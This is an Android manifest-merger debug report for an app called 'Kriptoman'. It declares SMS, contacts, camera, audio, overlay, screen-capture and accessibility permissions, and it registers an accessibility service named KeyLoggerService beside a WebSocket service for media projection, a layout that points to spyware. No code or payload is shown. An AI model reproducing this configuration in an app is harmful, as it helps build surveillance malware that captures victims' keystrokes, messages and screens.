android/app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.kriptoman"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="21"
8-->src/main/AndroidManifest.xml
9        android:targetSdkVersion="33" />
9-->src/main/AndroidManifest.xml
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src/main/AndroidManifest.xml:3:5-67
11-->src/main/AndroidManifest.xml:3:22-64
12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
12-->src/main/AndroidManifest.xml:4:5-79
12-->src/main/AndroidManifest.xml:4:22-76
13    <uses-permission android:name="android.permission.READ_CONTACTS" />
13-->src/main/AndroidManifest.xml:5:5-72
13-->src/main/AndroidManifest.xml:5:22-69
14    <uses-permission android:name="android.permission.READ_SMS" />
14-->src/main/AndroidManifest.xml:6:5-67
14-->src/main/AndroidManifest.xml:6:22-64
15    <uses-permission android:name="android.permission.CAMERA" />
15-->src/main/AndroidManifest.xml:7:5-65
15-->src/main/AndroidManifest.xml:7:22-62
16    <uses-permission android:name="android.permission.RECORD_AUDIO" />
16-->src/main/AndroidManifest.xml:8:5-71
16-->src/main/AndroidManifest.xml:8:22-68
17    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
17-->src/main/AndroidManifest.xml:9:5-81
17-->src/main/AndroidManifest.xml:9:22-78
18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
18-->src/main/AndroidManifest.xml:10:5-77
18-->src/main/AndroidManifest.xml:10:22-74
19    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
19-->src/main/AndroidManifest.xml:11:5-78
19-->src/main/AndroidManifest.xml:11:22-75
20    <uses-permission android:name="android.permission.MEDIA_PROJECTION" />
20-->src/main/AndroidManifest.xml:12:5-75
20-->src/main/AndroidManifest.xml:12:22-72
21    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
21-->src/main/AndroidManifest.xml:13:5-85
21-->src/main/AndroidManifest.xml:13:22-82
22
23    <permission
23-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
24        android:name="com.kriptoman.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
24-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
25        android:protectionLevel="signature" />
25-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
26
27    <uses-permission android:name="com.kriptoman.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
27-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
27-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
28
29    <application
29-->src/main/AndroidManifest.xml:14:5-36:19
30        android:allowBackup="true"
30-->src/main/AndroidManifest.xml:15:9-35
31        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
31-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
32        android:debuggable="true"
33        android:label="Kriptoman"
33-->src/main/AndroidManifest.xml:16:9-34
34        android:theme="@style/Theme.AppCompat.Light.NoActionBar" >
34-->src/main/AndroidManifest.xml:17:9-65
35        <activity
35-->src/main/AndroidManifest.xml:18:9-23:20
36            android:name="com.kriptoman.MainActivity"
36-->src/main/AndroidManifest.xml:18:19-47
37            android:exported="true" >
37-->src/main/AndroidManifest.xml:18:48-71
38            <intent-filter>
38-->src/main/AndroidManifest.xml:19:13-22:29
39                <action android:name="android.intent.action.MAIN" />
39-->src/main/AndroidManifest.xml:20:17-69
39-->src/main/AndroidManifest.xml:20:25-66
40
41                <category android:name="android.intent.category.LAUNCHER" />
41-->src/main/AndroidManifest.xml:21:17-77
41-->src/main/AndroidManifest.xml:21:27-74
42            </intent-filter>
43        </activity>
44
45        <service
45-->src/main/AndroidManifest.xml:24:9-149
46            android:name="com.kriptoman.WebSocketService"
46-->src/main/AndroidManifest.xml:24:18-50
47            android:enabled="true"
47-->src/main/AndroidManifest.xml:24:51-73
48            android:exported="false"
48-->src/main/AndroidManifest.xml:24:74-98
49            android:foregroundServiceType="mediaProjection" />
49-->src/main/AndroidManifest.xml:24:99-146
50        <service
50-->src/main/AndroidManifest.xml:25:9-35:19
51            android:name="com.kriptoman.KeyLoggerService"
51-->src/main/AndroidManifest.xml:26:13-45
52            android:exported="true"
52-->src/main/AndroidManifest.xml:28:13-36
53            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
53-->src/main/AndroidManifest.xml:27:13-79
54            <intent-filter>
54-->src/main/AndroidManifest.xml:29:13-31:29
55                <action android:name="android.accessibilityservice.AccessibilityService" />
55-->src/main/AndroidManifest.xml:30:17-92
55-->src/main/AndroidManifest.xml:30:25-89
56            </intent-filter>
57
58            <meta-data
58-->src/main/AndroidManifest.xml:32:13-34:72
59                android:name="android.accessibilityservice"
59-->src/main/AndroidManifest.xml:33:17-60
60                android:resource="@xml/accessibility_service_config" />
60-->src/main/AndroidManifest.xml:34:17-69
61        </service>
62
63        <provider
63-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
64            android:name="androidx.startup.InitializationProvider"
64-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
65            android:authorities="com.kriptoman.androidx-startup"
65-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
66            android:exported="false" >
66-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
67            <meta-data
67-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
68                android:name="androidx.emoji2.text.EmojiCompatInitializer"
68-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
69                android:value="androidx.startup" />
69-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
70            <meta-data
70-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:31:13-33:52
71                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
71-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:32:17-78
72                android:value="androidx.startup" />
72-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:33:17-49
73        </provider>
74    </application>
75
76</manifest>